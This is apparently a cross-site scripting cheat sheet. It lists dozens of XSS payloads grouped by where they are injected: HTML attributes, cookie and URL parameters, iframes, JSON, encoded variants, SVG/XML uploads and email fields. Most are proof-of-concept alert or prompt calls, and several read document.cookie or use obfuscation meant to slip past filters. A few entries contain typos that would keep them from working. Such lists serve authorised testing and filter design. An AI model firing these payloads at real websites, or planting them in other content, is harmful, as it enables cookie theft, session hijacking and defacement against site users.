## Malicious special characters which can lead to injection attacks
    <>/:="'&()`?.*$%\|:;{}@!#-


## Basic Stored/Reflected XSS Payloads
    t2mgs'><script>alert(8)<%2fscript>gdn5&NA=1
    <img/src=`%00` onerror=this.onerror=confirm(document.domain)>
    <img src=AAA onerror='(alert)(1)' />
    '"><img/src/onerror=alert(6)>
    <img src=x onmouseover=prompt(document.domain)>
    &lt;img src=x onmouseover=prompt(document.domain)&gt;
    ''><svg onload=alert(document.cookie)>//
    XSS <img/src=`%00` onerror=this.onerror=confirm(document.domain)>
    '><img/src=`%00` onerror=this.onerror=confirm(document.domain)>
    "onmouseover="prompt(1):b2r${{7*7}}onmouseover=prompt(1)gssssdds
    '%3balert(1)%5c%2f%5c%2f676
    <img/src/onerror=prompt(document.cookie)>
    "\"><img src=x oneerror=alert(document.domain>"
    <img src=xonmouseover=prompt(documnent.domain)>
    <img src=x onmouseover="confirm(documnent.domain)">
    >>'"><img onmouseover=alert(1) src=2><script>1<
    "><img src=1 onmouseover=prompt("xss") >
    ><img src=s onmouseover='prompt(document.cookie)'>
    Xss<!--{cke_protected} --!><img src=1 onerror=alert(location.href)>-->Attack
    "<applet onpointermove="al\u{65}\u{72}t(cookie)" contenteditable>Copy me</applet>"
    <img src=x onerror=prompt(document.domain)>
    <svg onpointerenter=prompt(domain)>
    test<img src=x onerror='(alert)(1)'> 
    "><img src=x onerror=alert(1)>
    </Script/><Img/Src/OnError=_=confirm,_(1)>
    \"><img src=x oneerror=alert(6666)>
    \"><input.autofocus.nope=\"%26quot;x%26quot;\"onfocus=\"Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'do'+'main'))\">
    '''><img/src/onerror=alert(2)>
    anything<script>confirm(2)" onmouseover="confirm(document.cookie)
    XSS<img/src='%00' onerror=this.onerror=confirm(document.domain)>
    "aaa&#x3C;a href=javas&#x26;#99;ript:alert(1)&#x3E;click
    any<applet onpointermove=alert(document.cookie)>copy me</applet>
    "<applet onpointermove="al\u{65}\u{72}t(cookie)" contenteditable>copy
    

## XSS in the cookie Parameter
    16319';confirm('ReflectedXSS')\/\/259

## XSS through Iframe Injection
    en-usasl8b'><<iframe src=http://aajtak.com>
    123<iframe srcdoc='<svg/o&#x6Eload=prompt(document.domain)>'>
    123%22<iframe%20srcdoc='%26lt;img/o%6eerror=prompt(1337)%20src=123%26gt;'>

## XSS Payload in Json file
    \"><input autofocus nope=\"%26quot;x%26quot;\"onfocus=\"Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'do'+'main'))\">

## Encoded XSS Payload
    %27%22%3E%3Cimg%2Fsrc%2Fonerror%3Dprompt(23)%3E
    Xss&lt;&#33;&#45;&#45;&#123;cke&#95;protected&#125;&#32;&#45;&#45;&#33;&gt;&lt;img&#32;src&#61;1&#32;onerror&#61;alert&#40;location&#46;href&#41;&gt;&#45;&#45;&gt;Attack
    %27;alert(document.cookie);//
    &amp;lt;a/onmouseover=prompt(1)&amp;gt
    '"&gt;<img src="" onerror="alert(2)">
    &#39;&quot;&gt;&lt;img/src/onErroR=alert(domain)&gt;
    &#x78;&#x73;&#x73;&#x27;&#x22;&#x3e;&#x3c;&#x69;&#x6d;&#x67;&#x20;&#x73;&#x72;&#x63;&#x3d;&#x78;&#x20;&#x6f;&#x6e;&#x65;&#x72;&#x72;&#x6f;&#x72;&#x3d;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x63;&#x6f;&#x6f;&#x6b;&#x69;&#x65;&#x29;&#x3b;&#x3e;

## xss in url parameter 
    ID =1%3C/Script/%3E%3CImg/Src/OnError=_=confirm,_(1)%3E
    %27%3E%3Cscript%3Ealert(5)%3C%2Fscript%3E
    DirName=t2mgs%27%3E%3Cscript%3Ealert(8)%3C%2fscript%3Egdtn5&NA=1
    %26p=%22%3balert(`parameter-pollution`)%2f%2f

## DOM Manipulation XSS Payload/JavaScript-Based Reflected/Stored XSS Payload
    '''><script>document.body.innerHTML="<img src='https://english.cdn.zeenews.com/sites/default/files/styles/zm_700x400/public/2020/03/07/847959-cyber-attack-india.jpg'>"</script>    

## XSS through XML upload
    <?xml version="1.0" standalone="no"?>
    
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    
    <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
      
      <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
      
      <image href="x" onerror="alert(document.domain)" />
      
    </svg>

## XSS in the email id 
    Arun@aruntester.com+"<script>alert(55)</script>"



